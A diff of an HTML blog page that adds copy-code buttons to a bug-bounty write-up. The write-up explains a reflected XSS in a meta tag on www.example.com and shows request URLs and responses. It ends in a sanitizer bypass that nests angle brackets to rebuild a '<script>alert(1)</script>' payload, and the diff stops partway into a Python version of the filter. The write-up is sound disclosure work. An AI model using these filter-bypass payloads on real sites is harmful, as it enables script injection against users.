@@ -391,6 +391,12 @@
 
 <p>I found this vulnerability through gau + kxss. If you are looking for XSS in the subdomain www.example.com, you can use the following command</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">gau www.example.com | kxss
 </span></code></pre></div></div>
 
@@ -418,12 +424,24 @@
 
 <p>Suppose that the URL returned by gau + kxss is as follows</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1
 </code></pre></div></div>
 
 <p>where vuln-param is the vulnerable param to XSS.</p>
 
 <p>The parameter was reflected in several places but the problematic characters was reflected only in one of them: in the content attribute of a meta tag. So the response of the above request contained the following HTML code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">/&gt;</span>
 </code></pre></div></div>
@@ -434,10 +452,22 @@
 
 <p>so I tried to break the attribute assignment through a request of the form</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;bugbountytest2
 </code></pre></div></div>
 
 <p>and the response contained the following HTML code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
 bugbountytest2
@@ -445,10 +475,22 @@ bugbountytest2
 
 <p>So far so good. Then I tried to inject some javascript code through a request of the form</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
 </code></pre></div></div>
 
 <p>and the response contained the following HTML code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
 alert(1)
@@ -460,20 +502,44 @@ alert(1)
 
 <p>To answer the above question I sent a request of the form</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;bugbountytest2&gt;</span>
 </code></pre></div></div>
 
 <p>and the response contained the following HTML code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
 </code></pre></div></div>
 
 <p>so the sanitization removes all the content between the &lt; and &gt; characters, both characters included, and not only the content that matches with some keywords. After that I wondered if nesting the &lt; and &gt; characters would give a different result so I sent several requests nesting the &lt; and &gt; characters but the most revealing of all was</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;</span><span class="err">&lt;</span><span class="nt">&gt;</span>bugbountytest2&gt;
 </code></pre></div></div>
 
 <p>whose response contained the following HTML code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;bugbountytest2&gt;</span>
@@ -481,10 +547,22 @@ alert(1)
 
 <p>This result yields a very clear way of injecting javascript code in the response using the following request</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.example.com/?vuln-param=bugbountytest1'"&gt;<span class="nt">&lt;</span><span class="err">&lt;</span><span class="nt">&gt;</span>script&gt;alert(1)<span class="nt">&lt;</span><span class="err">&lt;</span><span class="nt">&gt;</span>/script&gt;
 </code></pre></div></div>
 
 <p>The response contained the following HTML code</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"title"</span> <span class="na">content=</span><span class="s">"Resultados asociados a la palabra: 'bugbountytest1'"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
@@ -519,6 +597,12 @@ alert(1)
 <h3 id="323-code-of-the-algorithms">3.2.3. Code of the algorithms</h3>
 
 <p>The backend was designed in PHP but I have implemented both algorithms in python to show in practice what I mean by both algorithms</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Return the result of removing from input the substring between the characters in positions i and j
 </span><span class="k">def</span> <span class="nf">remove_substring</span><span class="p">(</span><span class="nb">input</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">):</span>
